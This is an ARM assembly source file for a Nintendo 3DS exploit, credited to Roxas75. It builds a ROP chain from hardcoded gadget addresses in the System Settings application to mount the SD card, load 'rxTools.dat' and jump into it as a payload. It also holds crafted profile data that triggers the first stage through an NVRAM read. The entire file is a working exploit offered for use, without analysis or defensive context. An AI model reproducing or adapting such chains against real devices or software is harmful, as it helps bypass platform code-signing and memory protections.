@3DS memchunkhax & firmlaunchax from mset 4.x, on firmware >= 5.x
@Roxas75

.arm
.align 2
@.org 0x279400

.equ pop_pc,                                    0x001002F9
.equ pop_r0,                                    0x00143D8C
.equ pop_r0_r2,                                 0x0010f2b9
.equ pop_r3,                                    0x0010538C
.equ pop_r1,                                    0x001549E1
.equ pop_r4_lr_bx_r1,                           0x001182C0
.equ pop_r0_r4,                                 0x0016FE91
.equ add_sp_r3,                                 0x00143D60

.equ YS_label,                                  0x00272BAE
.equ fs_mountsdmc,                              0x0018F19C @ pops 3
.equ load_addr,                                 0x002AF000

.equ read_nvram,                                0x001334FC
.equ memcpy,                                    0x001BFA60
.equ svcSleepThread,                            0x001AEA50
.equ filehandle,                                0x00279000
.equ ifile_open,                                0x001B82A8
.equ ifile_read,                                0x001B3954
.equ ifile_write,                               0x001B3B50
.equ ssl_dec,                                   0x0022EFA8

first_profile:

    _start:
        .word pop_r0_r2
            .word YS_label
            .word 0xDEADBEEF
        .word fs_mountsdmc
            .fill 3,4,0xDEADBEEF
        .word pop_r0_r2
            .word filehandle
            .word 1
        .word pop_r1
            .word 0x00295E0C @ YS:/rxTools.dat
        .word ifile_open+4
            .fill 5,4,0xDEADBEEF
        .word pop_r0_r2
            .word filehandle
            .word load_addr
        .word pop_r1
            .word filehandle+0x20
        .word pop_r3
            .word 0x9000
        .word ifile_read+4
            .fill 6,4,0xDEADBEEF
        .word pop_r0_r4
            .word ssl_dec+4
            .word 0x144cbc
            .word load_addr
            .word 0x9000
            .word pop_r1
        .word ssl_dec+4
            .word ssl_dec+4
            .word pop_r3
            .word 0x1460
            .word 0x143D60
            .word 0x9000
            .word pop_pc
        .word pop_r3
            .word load_addr-jump_to_payload-4

    jump_to_payload:
        .word add_sp_r3

        .fill 16,4,0xDEADBEEF
    _end:
_orga100: .fill (0x100+_start-_orga100)/4,4,0xDEADBEEF

second_profile:
    _start2:
        .word 0x050F0005
        .hword 0x1D
        .string16 "rxTools"
	.word 0x00000000
	.hword 0x0000
	.hword 0x0007
	.string16 "YS:/rxTools.dat"
.align 2
_orga150: .fill (0x150+_start-_orga150)/4,4,0xDEADBEEF
        .word 0x6E
        .word 0
        .word 0x0265021A
        .word 0x0DE01319
        .word 0xACE60E11
        .word 0x0100FE00
        .word 0x124A4FA5
        .word 0
        .word 0x3A370052
        .word 0x003F0001
_orga1B4: .fill (0x1B4+_start-_orga1B4)/4,4,0xDEADBEEF

    first_rop:
        .word pop_r0_r2
            .word 0x1FE00
            .word 0x100
        .word pop_r1
            .word 0x279400
        .word read_nvram
            .word 0xDEADBEEF
        .word pop_r3
            .word 0xF027949C
        .word add_sp_r3

    _end2:
        .fill 9,4,0xDEADBEEF

.pool
